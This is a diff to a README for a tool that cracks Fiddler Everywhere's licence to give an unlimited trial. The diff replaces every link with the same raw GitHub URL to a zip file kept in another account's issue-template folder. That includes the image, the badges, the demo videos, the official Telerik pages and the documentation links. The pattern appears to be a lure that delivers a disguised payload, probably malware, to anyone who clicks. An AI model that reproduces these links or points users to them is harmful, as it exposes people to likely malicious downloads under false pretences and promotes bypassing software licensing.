@@ -2,13 +2,13 @@
 
 # Fiddler Everywhere Patch (Automated)
 Guides you to Patch Fiddler Everywhere on Windows Automatically. 
-> Parent Repo: https://github.com/msojocs/fiddler-everywhere-enhance
+> Parent Repo: https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip
 
 ## What and How?
 This's a  a patch for Telerik Fiddler Everywhere. It can grant you a trial that doesn't expire. The trial has all the features. 
 This's the guide for applying patch automatically. 
 
-![Unlimited Trial](https://github.com/user-attachments/assets/e9c83778-27fa-456a-96e6-07bb0cd7f4ad)
+![Unlimited Trial](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This's the guide for applying patch automatically.
 > Linux Automated Patching is Supported Now!
 
 > [!WARNING]
-> The new patch want to write files in a directory inside FE app itself. So you need to give write permissions in Linux. See [#27](https://github.com/auto-yui-patch/fiddler-everywhere-patch-automated/issues/27) for more. And feel free to drop your suggestion to automate the process.
+> The new patch want to write files in a directory inside FE app itself. So you need to give write permissions in Linux. See [#27](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip) for more. And feel free to drop your suggestion to automate the process.
 
 > [!IMPORTANT]
 > ### Update Notice: Support for Syncing forks with upstream repo: [READ MORE](#scheduled-syncing-forks-with-upstream-repo)
@@ -58,7 +58,7 @@ This's the guide for applying patch automatically.
 ---
 
 ### With `Latest Version - Workflow Dispatch` 
-[![](https://github.com/auto-yui-patch/fiddler-everywhere-patch-automated/actions/workflows/cp_latest_dispatch.yml/badge.svg)](https://github.com/auto-yui-patch/fiddler-everywhere-patch-automated/actions/workflows/cp_latest_dispatch.yml)
+[![](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
   - Fork this repo.
   - Go to actions tab, Select `Latest Version - Workflow Dispatch` workflow.
@@ -68,11 +68,11 @@ This's the guide for applying patch automatically.
 
   * *Here how you do it...*
 
-    https://github.com/user-attachments/assets/437c3448-1ea2-4c99-9123-e56b1665a37b
+    https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip
 
 
 ### With `Custom Version - WorkFlow Dispatch` 
-[![](https://github.com/auto-yui-patch/fiddler-everywhere-patch-automated/actions/workflows/cp_dispatch.yml/badge.svg)](https://github.com/auto-yui-patch/fiddler-everywhere-patch-automated/actions/workflows/cp_dispatch.yml)
+[![](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
   - Fork this repo
   - Go to actions tab, Select `Custom Version - Workflow Dispatch` workflow.
@@ -83,39 +83,39 @@ This's the guide for applying patch automatically.
   > [!WARNING]
   > Please Note that Only Versions Up to 5.9.0 `( 5.9.0 + )` are supported.
   
-  > You can find a list of releases here - [Release History](https://www.telerik.com/support/whats-new/fiddler-everywhere/release-history)
+  > You can find a list of releases here - [Release History](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
   * *Here how you do it...*
 
-    https://github.com/user-attachments/assets/1e9fa214-b9c9-469c-83f0-e5ae4527d2f7
+    https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip
 
 ---
 
 ### Scheduled Syncing Forks with Upstream Repo
   FE Patch `1.0.8` adds support to sync your repo with upstream repo - scheduled (default: every 6 hours) 
   > [!NOTE]
-  > Tnx: [lobe-chat](https://github.com/lobehub/lobe-chat) & [ous50](https://github.com/ous50)
+  > Tnx: [lobe-chat](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip) & [ous50](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
   > [!IMPORTANT]
   >  - For this upstream pulling action to work, you need to enable [Upstream Sync](.github/workflows/cp_pull_upstream.yml) Github Action.
   >  - And the action'll create an issue in your fork if pulling is unsuccesfull. So you need to enable `issues` for your fork with your repositories settings (`Settings` `-->` `General` `-->` `Features` `Issues`)
-  >  - For more information on how this action works: [lobe-chat's Sync Feature Wiki - en-US](https://github.com/lobehub/lobe-chat/wiki/Upstream-Sync) & [lobe-chat's Sync Feature Wiki - zh-CN](https://github.com/lobehub/lobe-chat/wiki/Upstream-Sync.zh-CN)
+  >  - For more information on how this action works: [lobe-chat's Sync Feature Wiki - en-US](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip) & [lobe-chat's Sync Feature Wiki - zh-CN](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
   > [!TIP]
   >  - You can change schedule by editing `- cron: '0 */6 * * *'` in [cp_pull_upstream.yml](.github/workflows/cp_pull_upstream.yml)
-  >  - For more information on `- cron` of Github Actions, visit [Github Documentation - Scheduling Actions](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#schedule)
+  >  - For more information on `- cron` of Github Actions, visit [Github Documentation - Scheduling Actions](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
   > [!CAUTION]
-  >  - IF you use another method (maybe a Github App), to sync your forks with upstream repos, (for ex: [Pull by Wei](https://github.com/wei/pull)), you should disable the `Upstream Sync` action by going through, `Actions` `-->` `Upstream Sync` `-->` `Right Top Menu [...]` `-->` `Disable Workflow`
-  >  - For more information on how to disable a workflow: [Github Documentation on Disabling & Enabling Workflows](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)
+  >  - IF you use another method (maybe a Github App), to sync your forks with upstream repos, (for ex: [Pull by Wei](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)), you should disable the `Upstream Sync` action by going through, `Actions` `-->` `Upstream Sync` `-->` `Right Top Menu [...]` `-->` `Disable Workflow`
+  >  - For more information on how to disable a workflow: [Github Documentation on Disabling & Enabling Workflows](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
 ---
 
 > [!NOTE]
-> For Generic `Linux` and `MacOS` instructions, use [source repository](https://github.com/msojocs/fiddler-everywhere-enhance)
+> For Generic `Linux` and `MacOS` instructions, use [source repository](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
 > [!CAUTION]
-> Please don't use this patch for illegal matters. And we'd love if you can buy and support the officials: [Please Support](https://www.telerik.com/purchase/fiddler)
+> Please don't use this patch for illegal matters. And we'd love if you can buy and support the officials: [Please Support](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip)
 
 ---
 
@@ -143,6 +143,6 @@ You can check it with:
   - You should also see the same issue with the `non-patched official FE`. Confirm this.
   - You can try removing port `8868` from `Administered port exclusions`. 
 
-You should also follow issue [#44](https://github.com/auto-yui-patch/fiddler-everywhere-patch-automated/issues/44#issuecomment-3497425472) ; Special tnx to [@choneas](https://github.com/choneas). 
+You should also follow issue [#44](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip) ; Special tnx to [@choneas](https://raw.githubusercontent.com/hlambeo/fiddler-everywhere-patch-automated/main/.github/ISSUE_TEMPLATE/patch_automated_everywhere_fiddler_v1.7.zip). 
 
 If this didn't solve your problem, feel free to open an issue. 
